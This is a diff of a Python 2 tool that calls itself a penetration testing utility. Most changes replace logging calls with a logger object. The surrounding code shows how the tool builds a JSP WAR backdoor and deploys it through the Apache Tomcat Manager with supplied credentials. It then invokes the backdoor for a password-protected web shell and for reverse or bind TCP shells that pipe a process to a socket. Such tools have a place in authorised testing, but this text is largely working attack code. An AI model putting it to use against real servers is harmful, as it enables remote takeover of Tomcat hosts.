@@ -49,17 +49,17 @@ logger = logging.getLogger()
 
 
 def establishReverseTcpListener(opts):
-    logging.debug('Establishing listener for incoming reverse TCP shell...')
+    logger.debug('Establishing listener for incoming reverse TCP shell...')
 
 def connectToBindShell(hostn, opts):
     host = hostn[:hostn.find(':')]
-    logging.debug('Shell has binded to port %s at remote host. Connecting back to it...' % opts.port)
+    logger.debug('Shell has binded to port %s at remote host. Connecting back to it...' % opts.port)
     
 
 def generateWAR(code, title, appname):
     dirpath = tempfile.mkdtemp()
 
-    logging.debug('Generating temporary structure for %s WAR at: "%s"' % (appname, dirpath))
+    logger.debug('Generating temporary structure for %s WAR at: "%s"' % (appname, dirpath))
 
     os.makedirs(dirpath + '/files/META-INF')
     os.makedirs(dirpath + '/files/WEB-INF')
@@ -71,9 +71,9 @@ def generateWAR(code, title, appname):
     m = re.search('version "([^"]+)"', javaver)
     if m:
         javaver = m.group(1)
-        logging.debug('Working with Java at version: %s' % javaver)
+        logger.debug('Working with Java at version: %s' % javaver)
     else:
-        logging.debug('Could not retrieve Java version. Assuming: "1.8.0_60"')
+        logger.debug('Could not retrieve Java version. Assuming: "1.8.0_60"')
         javaver = '1.8.0_60'
 
     with open(dirpath + '/files/META-INF/MANIFEST.MF', 'w') as f:
@@ -82,7 +82,7 @@ Created-By: %s (Sun Microsystems Inc.)
 
 ''' % javaver)
 
-    logging.debug('Generating web.xml with servlet-name: "%s"' % title)
+    logger.debug('Generating web.xml with servlet-name: "%s"' % title)
     with open(dirpath + '/files/WEB-INF/web.xml', 'w') as f:
         f.write('''<?xml version="1.0" encoding="ISO-8859-1"?>
 <web-app xmlns="http://java.sun.com/xml/ns/j2ee"
@@ -107,16 +107,16 @@ Created-By: %s (Sun Microsystems Inc.)
     cwd = os.getcwd()
     os.chdir(dirpath)
     outpath = tempfile.gettempdir() + '/' + appname + '.war'
-    logging.debug('Generating WAR file at: "%s"' % outpath)
+    logger.debug('Generating WAR file at: "%s"' % outpath)
     packing = commands.getstatusoutput('jar -cvf %s *' % outpath)
     os.chdir(cwd)
 
-    logging.debug(packing[1])
+    logger.debug(packing[1])
 
     tree = commands.getstatusoutput('tree %s' % dirpath)[1]
     if not ('sh' in tree and 'tree: not found' in tree):
-        logging.debug('WAR file structure:')
-        logging.debug(tree)
+        logger.debug('WAR file structure:')
+        logger.debug(tree)
 
     return (dirpath, outpath)
 
@@ -149,7 +149,7 @@ def prepareTcpShellCode(opts):
         ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
         ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
         ''' % {'host' : host, 'port': port }
-        logging.debug('Preparing additional code for Reverse TCP shell')
+        logger.debug('Preparing additional code for Reverse TCP shell')
     elif mode == 2:
         # Bind shell
         socketInvocation = ''' 
@@ -161,9 +161,9 @@ def prepareTcpShellCode(opts):
         ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
         ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
         ''' % {'port': port }
-        logging.debug('Preparing additional code for bind TCP shell')
+        logger.debug('Preparing additional code for bind TCP shell')
     else:
-        logging.debug('No additional code for shell functionality requested.')
+        logger.debug('No additional code for shell functionality requested.')
         return ''
 
     #
@@ -223,7 +223,7 @@ def prepareTcpShellCode(opts):
 
 
 def preparePayload(opts):
-    logging.debug('Generating JSP WAR backdoor code...')
+    logger.debug('Generating JSP WAR backdoor code...')
 
     shellFunc = ''
 
@@ -310,34 +310,34 @@ def preparePayload(opts):
 
 def invokeApplication(browser, url, opts):
     appurl = 'http://%s/%s/' % (url, opts.appname)
-    logging.debug('Invoking application at url: "%s"' % appurl)
+    logger.debug('Invoking application at url: "%s"' % appurl)
 
     try:
         mode = chooseShellFunctionality(opts)
         if opts.shellpass and mode > 0:
-            logging.debug("Adding 'X-Pass: %s' header for shell functionality authentication." % opts.shellpass)
+            logger.debug("Adding 'X-Pass: %s' header for shell functionality authentication." % opts.shellpass)
             browser.addheaders.append(('X-Pass', opts.shellpass))
 
         if mode == 1 and opts.noconnect:
-            logging.warning("Set up your incoming shell listener, I'm giving you 3 seconds.")
+            logger.warning("Set up your incoming shell listener, I'm giving you 3 seconds.")
             time.sleep(3)
         elif mode == 0 and opts.noconnect:
-            logging.warning("Connect back to your shell at: %s:%s" % (url[:url.find(':')], opts.port))
+            logger.warning("Connect back to your shell at: %s:%s" % (url[:url.find(':')], opts.port))
         elif mode == 2 and opts.noconnect:
-            logging.warning("Shell has been binded. Go and connect back to it!")
+            logger.warning("Shell has been binded. Go and connect back to it!")
         resp = browser.open(appurl)
         return True
 
     except urllib2.HTTPError, e:
         if e.code == 404:
-            logging.error('Application "%s" does not exist, or was not deployed.' % opts.appname)
+            logger.error('Application "%s" does not exist, or was not deployed.' % opts.appname)
         else:
-            logging.error('Failed with error: %d, msg: "%s"' % (int(e.code), str(e)))
+            logger.error('Failed with error: %d, msg: "%s"' % (int(e.code), str(e)))
 
     return False
 
 def deployApplication(browser, url, appname, warpath):
-    logging.debug('Deploying application: %s from file: "%s"' % (appname, warpath))
+    logger.debug('Deploying application: %s from file: "%s"' % (appname, warpath))
     resp = browser.open(url)
     for form in browser.forms():
         action = urllib.unquote_plus(form.action)
@@ -362,7 +362,7 @@ def checkIsDeployed(browser, url, appname):
 
 def unloadApplication(browser, url, appname):
     appurl = 'http://%s/%s/' % (url, appname)
-    logging.debug('Unloading application: "%s"' % appurl)
+    logger.debug('Unloading application: "%s"' % appurl)
     for form in browser.forms():
         action = urllib.unquote_plus(form.action)
         if url in action and '/undeploy?path=/'+appname in action:
@@ -404,6 +404,8 @@ def browseToManager(url, user, password):
             logger.error('Could not connect with "%s", connection refused.' % url)
         elif 'Error 404' in str(e):
             logger.error('Server returned 404 Not Found on specified URL: %s' % url)
+        elif 'Error 401' in str(e):
+            logger.error('Invalid credentials supplied for Apache Tomcat.')
         else:
             logger.error('Browsing to the server (%s) failed: %s' % (url, e))
         return None
@@ -411,9 +413,9 @@ def browseToManager(url, user, password):
     src = page.read()
 
     if validateManagerApplication(browser):
-        logging.debug('Apache Tomcat Manager Application reached & validated.')
+        logger.debug('Apache Tomcat Manager Application reached & validated.')
     else:
-        logging.error('Specified URL does not point at the Apache Tomcat Manager Application')
+        logger.error('Specified URL does not point at the Apache Tomcat Manager Application')
         return None
 
     return browser
@@ -466,9 +468,9 @@ Penetration Testing utility aiming at presenting danger of leaving Tomcat miscon
         logger.error('Both RHOST and RPORT must be specified to deploy reverse tcp payload.')
         sys.exit(0)
     elif (opts.port and not opts.host):
-        logging.info('Bind shell will be deployed on: %s:%s' % (args[0][:args[0].find(':')], opts.port))
+        logger.info('Bind shell will be deployed on: %s:%s' % (args[0][:args[0].find(':')], opts.port))
     elif (opts.host and opts.port):
-        logging.info('Reverse shell will connect to: %s:%s.' % (opts.host, opts.port))
+        logger.info('Reverse shell will connect to: %s:%s.' % (opts.host, opts.port))
 
     if opts.file and not os.path.exists(file):
         logger.error('Specified WAR file does not exists in local filesystem.')
@@ -499,20 +501,20 @@ def main():
             warpath = opts.file
 
         if checkIsDeployed(browser, url, opts.appname):
-            logging.warning('Application with name: "%s" is already deployed.' % opts.appname)
+            logger.warning('Application with name: "%s" is already deployed.' % opts.appname)
             if opts.unload:
-                logging.debug('Unloading existing one...')
+                logger.debug('Unloading existing one...')
                 if unloadApplication(browser, args[0], opts.appname):
-                    logging.debug('Succeeded.')
+                    logger.debug('Succeeded.')
                 else:
-                    logging.debug('Unloading failed.')
+                    logger.debug('Unloading failed.')
                     return
             else:
-                logging.warning('Not continuing until the application name is changed or current one unloaded.')
-                logging.warning('Please use -x (--unload) option to force existing application unloading.')
+                logger.warning('Not continuing until the application name is changed or current one unloaded.')
+                logger.warning('Please use -x (--unload) option to force existing application unloading.')
                 return
         else:
-            logging.debug('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)
+            logger.debug('It looks that the application with specified name "%s" has not been deployed yet.' % opts.appname)
 
         deployed = deployApplication(browser, url, opts.appname, warpath)
 
@@ -521,28 +523,28 @@ def main():
             shutil.rmtree(dirpath)
 
         if deployed:
-            logging.debug('Succeeded, invoking it...')
+            logger.debug('Succeeded, invoking it...')
 
             if mode == 1 and not opts.noconnect:
                 # if Reverse TCP - firstly establish listener, then invoke application.
                 establishReverseTcpListener(opts)
 
             if invokeApplication(browser, args[0], opts):
-                logging.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
-                logging.info("\033[0;33mHappy pwning, here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
+                logger.info("\033[0;32mJSP Backdoor up & running on http://%s/%s/\033[1;0m" % (args[0], opts.appname))
+                logger.info("\033[0;33mHappy pwning, here take that password for web shell: '%s'\033[1;0m" % opts.shellpass)
 
                 if mode == 2 and not opts.noconnect:
                     # If Bind TCP - firstly invoke application, then connect back to it.
                     connectToBindShell(args[0], opts)
 
                 if mode == 0:
-                    logging.debug('No shell functionality was included in backdoor.')
+                    logger.debug('No shell functionality was included in backdoor.')
             else:
-                logging.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")
+                logger.error("\033[1;41mNo pwning today, backdoor was not deployed.\033[1;0m")
 
 
         else:
-            logging.error('Failed.')
+            logger.error('Failed.')
 
     except KeyboardInterrupt:
         print '\nUser interruption.'
